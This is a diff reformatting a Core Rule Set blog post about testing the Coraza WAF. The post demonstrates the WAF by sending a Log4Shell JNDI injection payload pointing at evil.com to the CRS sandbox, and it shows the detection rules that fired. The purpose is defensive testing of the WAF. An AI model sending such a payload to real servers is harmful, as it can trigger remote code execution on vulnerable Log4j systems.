@@ -3,8 +3,6 @@ author: dune73
 categories:
   - Blog
 date: '2021-12-22T13:23:02+01:00'
-guid: https://coreruleset.org/?p=1584
-id: 1584
 permalink: /20211222/talking-about-modsecurity-and-the-new-coraza-waf/
 title: Talking about ModSecurity and the new Coraza WAF
 url: /2021/12/22/talking-about-modsecurity-and-the-new-coraza-waf/
@@ -50,16 +48,18 @@ Coraza is an implementation of a SecLang engine in the memory-safe Go language, 
 {{< figure src="images/2021/12/coraza-logo-1024x253.png" caption="The new Coraza WAF with its pet \"Sancho\" on the right." >}}
 To give you an early access to Coraza, if you do not have a Caddy webserver to play around, we have set up a Caddy with Coraza on our CRS sandbox, and you can try it out immediately. In the following example, we will send a Log4J exploit to the sandbox. Note that with the “x-backend” header, we pick Coraza as an engine, and with “x-crs-version” we pick the Core Rule Set with the extra Log4J rule from our [earlier Log4J blog post](https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/).
 
-> $ curl -H "x-crs-paranoia-level: 4" \\  
->  -H "x-format-output: txt-matched-rules" \\  
->  -H "x-backend: coraza" \\  
->  -H "x-crs-version: 3.4.0-dev-log4j" \\  
->  -H ‘***User-Agent: ${jndi:ldap://evil.com}***’ \\  
->  https://sandbox.coreruleset.org  
+```sh
+curl -H "x-crs-paranoia-level: 4" \
+  -H "x-format-output: txt-matched-rules" \
+  -H "x-backend: coraza" \
+  -H "x-crs-version: 3.4.0-dev-log4j" \
+  -H ‘***User-Agent: ${jndi:ldap://evil.com}***’ \
+  https://sandbox.coreruleset.org  
 > 1005 PL1 Potential Remote Command Execution: Log4j CVE-2021-44228  
 > 932130 PL1 Remote Command Execution: Unix Shell Expression Found  
 > 949110 PL1 Inbound Anomaly Score Exceeded (Total Score: 10)  
 > 980130 PL1 Inbound Anomaly Score Exceeded (Total Inbound Score: 10 - SQLI=0,XSS=0,RFI=0,LFI=0,RCE=10,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 10, 0, 0, 0
+```
 
 #### **Conclusion**
 
